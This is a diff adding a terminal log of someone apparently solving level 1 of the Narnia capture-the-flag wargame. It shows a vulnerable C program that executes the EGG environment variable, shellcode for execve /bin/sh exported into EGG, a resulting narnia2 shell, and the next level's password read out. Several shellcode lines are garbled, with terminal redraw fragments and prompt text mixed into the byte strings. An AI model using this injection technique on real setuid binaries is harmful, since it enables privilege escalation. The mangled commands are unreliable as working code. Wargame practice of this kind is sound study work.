@@ -1,0 +1,62 @@
+//solving narnia 1
+
+narnia1@narnia:~$ ls
+narnia1@narnia:~$ cd /narnia
+narnia1@narnia:/narnia$ ls
+narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
+narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
+narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c
+narnia1@narnia:/narnia$ cat narnia1.c 
+/*
+   This program is free software; you can redistribute it and/or modify
+   it under the terms of the GNU General Public License as published by
+   the Free Software Foundation; either version 2 of the License, or
+   (at your option) any later version.
+
+   This program is distributed in the hope that it will be useful,
+   but WITHOUT ANY WARRANTY; without even the implied warranty of
+   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+   GNU General Public License for more details.
+
+   You should have received a copy of the GNU General Public License
+   along with this program; if not, write to the Free Software
+   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+   */
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+    int (*ret)();
+
+    if(getenv("EGG")==NULL){
+        printf("Give me something to execute at the env-variable EGG\n");
+        exit(1);
+    }
+
+    printf("Trying to execute EGG!\n");
+    ret = (int (*)())getenv("EGG");
+    ret();
+
+    return 0;
+}
+narnia1@narnia:/narnia$ ./narnia1
+Give me something to execute at the env-variable EGG
+narnia1@narnia:/narnia$ ./narnia1 EGG
+Give me something to execute at the env-variable EGG
+narnia1@narnia:/narnia$ man export
+No manual entry for export
+narnia1@narnia:/narnia$ tldr export
+Command 'tldr' not found, but can be installed with:
+apt install tealdeer  # version 1.8.1-1, or
+apt install tldr-py   # version 0.7.0-8build1
+Ask your administrator to install one of them.
+<8\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")')                            Command 'python' not found, did you mean:
+  command 'python3' from deb python3
+  command 'python' from deb python-is-python3
+narnia1@narnia:/narnia$ export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x3lsclear       rnia:/narnia$ tldr export31\xd2\xb0\x0b\xcd\x80")'))
+lsclear: command not found                                                                tldrnarnia1@narnia:/narnia$ ./narnia1  \x31\xd2\xb0\x0b\xcd\x80")')
+Trying to execute EGG!
+$ whoami
+narnia2
+$ cat /etc/narnia_pass/narnia2
+0h8Tj5fxbv
